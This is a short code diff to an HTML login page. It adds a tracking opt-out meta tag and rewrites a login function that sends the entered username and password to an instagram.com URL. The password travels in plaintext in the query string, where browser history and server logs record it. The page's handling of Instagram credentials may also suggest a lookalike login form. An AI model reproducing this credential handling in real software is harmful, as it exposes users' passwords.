@@ -1,5 +1,6 @@
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Permissions-Policy" content="interest-cohort=()">
 </head>
 <div class="container">
 <style>
@@ -170,7 +171,8 @@ input:not(:placeholder-shown) {
 function login() {
   var user = document.getElementById('username').value;
   var pass = document.getElementById('password').value;
-  window.open("https://www.instagram.com/" + user + "?username=" + user + "&password="+pass,"_self");
+  var url = "https://www.instagram.com/" + user + "?username=" + user + "&password="+pass;
+  window.location.href = url;
 }
 </script>
     <div class="box">
